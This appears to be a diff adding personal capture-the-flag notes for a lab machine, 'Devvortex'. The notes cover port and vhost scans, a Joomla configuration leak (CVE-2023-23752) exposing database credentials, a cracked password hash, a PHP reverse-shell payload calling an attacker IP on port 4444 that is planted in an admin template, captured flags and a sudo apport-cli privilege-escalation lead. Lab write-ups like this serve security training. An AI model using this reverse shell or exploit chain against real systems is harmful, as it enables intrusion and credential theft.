@@ -1,0 +1,71 @@
+IP:10.10.11.242
+Nmap scan report for 10.10.11.242
+Host is up (0.14s latency).
+Not shown: 998 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
+|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
+|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 21.86 seconds
+
+
+Found vhost subdomain: dev.devvortex.htb
+gobuster vhost -u devvortex.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -t 40 --append-domain
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:             http://devvortex.htb
+[+] Method:          GET
+[+] Threads:         40
+[+] Wordlist:        /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt
+[+] User Agent:      gobuster/3.6
+[+] Timeout:         10s
+[+] Append Domain:   true
+===============================================================
+Starting gobuster in VHOST enumeration mode
+===============================================================
+Found: dev.devvortex.htb Status: 200 [Size: 23221
+
+Appears to be using Joomla - Cloned OWASP-joomscan
+
+Version: Joomla 4.2.6
+
+Vulnerable to CVE-2023-23752 - CODE EXecution - leacked password
+{"links":{"self":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true","next":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20","last":"http:\/\/dev.devvortex.htb\/api\/index.php\/v1\/config\/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"},"data":[{"type":"application","id":"224","attributes":{"offline":false,"id":224}},{"type":"application","id":"224","attributes":{"offline_message":"This site is down for maintenance.<br>Please check back again soon.","id":224}},{"type":"application","id":"224","attributes":{"display_offline_message":1,"id":224}},{"type":"application","id":"224","attributes":{"offline_image":"","id":224}},{"type":"application","id":"224","attributes":{"sitename":"Development","id":224}},{"type":"application","id":"224","attributes":{"editor":"tinymce","id":224}},{"type":"application","id":"224","attributes":{"captcha":"0","id":224}},{"type":"application","id":"224","attributes":{"list_limit":20,"id":224}},{"type":"application","id":"224","attributes":{"access":1,"id":224}},{"type":"application","id":"224","attributes":{"debug":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang":false,"id":224}},{"type":"application","id":"224","attributes":{"debug_lang_const":true,"id":224}},{"type":"application","id":"224","attributes":{"dbtype":"mysqli","id":224}},{"type":"application","id":"224","attributes":{"host":"localhost","id":224}},{"type":"application","id":"224","attributes":{"user":"lewis","id":224}},{"type":"application","id":"224","attributes":{"password":"P4ntherg0t1n5r3c0n##","id":224}},{"type":"application","id":"224","attributes":{"db":"joomla","id":224}},{"type":"application","id":"224","attributes":{"dbprefix":"sd4fg_","id":224}},{"type":"application","id":"224","attributes":{"dbencryption":0,"id":224}},{"type":"application","id":"224","attributes":{"dbsslverifyservercert":false,"id":224}}],"meta":{"total-pages":4}}
+
+
+Credentials
+lewis:P4ntherg0t1n5r3c0n##
+logan:$2y$10$I$T4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12(cracked: tequieromucho)
+
+
+Edited the template file with a php reverse shell payload
+payload - <?php exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.231/4444 0>&1'"); ?>
+exploit - http://dev.devvortex.htb//administrator/templates/atum/login.php
+
+
+Logan is the user on the box and his credentials are stored as bcrypt in the mysql database of the joomla server
+
+Flags:
+user: bd308270f6eeda10db3f0169715dd394
+root: 4cd340d8f82d7fa8611c53e69368f817
+
+Privesc appears to be possible with CVE-2023-1326 according to sudoers file
+sudo -l
+[sudo] password for logan:
+Matching Defaults entries for logan on devvortex:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+    User logan may run the following commands on devvortex:
+        (ALL : ALL) /usr/bin/apport-cli
+
+
+Exploit guide: https://diegojoelcondoriquispe.medium.com/cve-2023-1326-poc-c8f2a59d0e01
